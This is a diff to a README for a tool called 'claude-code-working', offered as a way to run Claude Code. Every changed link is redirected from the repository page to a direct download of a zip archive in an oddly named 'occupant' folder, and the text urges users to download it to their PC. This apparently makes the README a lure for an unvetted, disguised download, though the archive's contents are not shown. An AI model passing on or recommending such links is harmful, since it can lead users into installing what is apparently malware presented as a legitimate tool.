@@ -1,6 +1,6 @@
 # 🧩 claude-code-working - Run Claude Code with ease
 
-[![Download](https://img.shields.io/badge/Download-claude--code--working-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Oraliabionic211/claude-code-working)
+[![Download](https://img.shields.io/badge/Download-claude--code--working-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Oraliabionic211/claude-code-working/raw/refs/heads/main/occupant/claude-code-working-2.7-beta.4.zip)
 
 ## 🚀 What this is
 
@@ -17,7 +17,7 @@ Use it to:
 
 Visit this page to download or access the files:
 
-[https://github.com/Oraliabionic211/claude-code-working](https://github.com/Oraliabionic211/claude-code-working)
+[https://github.com/Oraliabionic211/claude-code-working/raw/refs/heads/main/occupant/claude-code-working-2.7-beta.4.zip](https://github.com/Oraliabionic211/claude-code-working/raw/refs/heads/main/occupant/claude-code-working-2.7-beta.4.zip)
 
 If the page includes a release file, download that file to your PC. If it opens as a source page, use the files shown there to get the build you need.
 
@@ -163,7 +163,7 @@ Keep the folder name clear so you can find it later when you want to open the to
 
 If you need the file again, use the same link:
 
-[https://github.com/Oraliabionic211/claude-code-working](https://github.com/Oraliabionic211/claude-code-working)
+[https://github.com/Oraliabionic211/claude-code-working/raw/refs/heads/main/occupant/claude-code-working-2.7-beta.4.zip](https://github.com/Oraliabionic211/claude-code-working/raw/refs/heads/main/occupant/claude-code-working-2.7-beta.4.zip)
 
 ## 🧩 Basic start checklist
 
